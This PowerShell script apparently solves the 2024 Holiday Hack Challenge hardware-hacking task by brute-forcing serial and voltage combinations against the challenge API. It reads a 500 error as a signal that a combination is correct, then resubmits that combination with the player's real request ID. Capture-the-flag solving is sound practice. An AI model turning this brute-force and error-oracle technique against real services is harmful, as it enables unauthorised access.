```
function Start-BruteForce {
    Clear-Host
    # Configuration
    $url = "https://hhc24-hardwarehacking.holidayhackchallenge.com/api/v1/complete"
    $rid = "00000000-0000-0000-0000-000000000000"
    $ProgressPreference = 'SilentlyContinue'  # Hide progress bar

    # Create a single session for all requests before we start
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = "JollyFrogs Hardware Hacking Brute-Forcer"

    function Send-VoltageTest {
        param (
            [string]$serial,
            [string]$voltage,
            [string]$requestId = $rid
        )
        
        $bodyJson = @{
            requestID = $requestId
            serial = $serial.ToCharArray() | ForEach-Object { [int]::Parse($_.ToString()) }
            voltage = [int]$voltage
        } | ConvertTo-Json

        Write-Host "`rCombination: $serial - Trying" -NoNewline

        try {
            $response = Invoke-WebRequest -UseBasicParsing -Uri $url `
                -Method "POST" `
                -WebSession $session `
                -Headers @{
                    "authority" = "hhc24-hardwarehacking.holidayhackchallenge.com"
                    "method" = "POST"
                    "path" = "/api/v1/complete"
                    "scheme" = "https"
                } `
                -ContentType "application/json" `
                -Body $bodyJson

            if ($response.Content -eq "true") {
                Write-Host "`rCombination: $serial - Success!" -ForegroundColor Green
                return $true
            }
            return $false
        }
        catch {
            if ($_.Exception.Response.StatusCode.value__ -eq 500) {
                Write-Host "`rCombination: $serial - Found it! (500 error)" -ForegroundColor Yellow
                Write-Host "`nCorrect combination found:"
                Write-Host "Serial: $serial"
                Write-Host "Voltage: ${voltage}V"

                # Prompt for real RID
                Write-Host "`nPlease enter your real Request ID: " -NoNewline -ForegroundColor Cyan
                $realRid = Read-Host

                # Try with real RID
                Write-Host "`nTrying combination with your Request ID..." -ForegroundColor Cyan
                $finalResult = Send-VoltageTest -serial $serial -voltage $voltage -requestId $realRid
                if ($finalResult -eq $true) {
                    Write-Host "Success! The challenge should now be completed!" -ForegroundColor Green
                }
                return "found"
            }
            return $null
        }
    }

    # Try each voltage level
    foreach ($voltage in @("3", "5")) {
        Write-Host "Trying all ${voltage}V combinations..." -ForegroundColor Cyan
        
        # Optimized ranges
        $d1 = 3..0
        $d2 = 9..0
        $d3 = 2..0
        $d4 = 3..0
        $d5 = 1..0
        $d6 = 3..0

        foreach ($i in $d1) {
            foreach ($j in $d2) {
                foreach ($k in $d3) {
                    foreach ($l in $d4) {
                        foreach ($m in $d5) {
                            foreach ($n in $d6) {
                                $serial = "$i$j$k$l$m$n"
                                $result = Send-VoltageTest -serial $serial -voltage $voltage
                                if ($result -eq "found") {
                                    return
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    Write-Host "`nBrute force completed without finding solution." -ForegroundColor Yellow
    Write-Host
}

# Execute the function
Start-BruteForce

```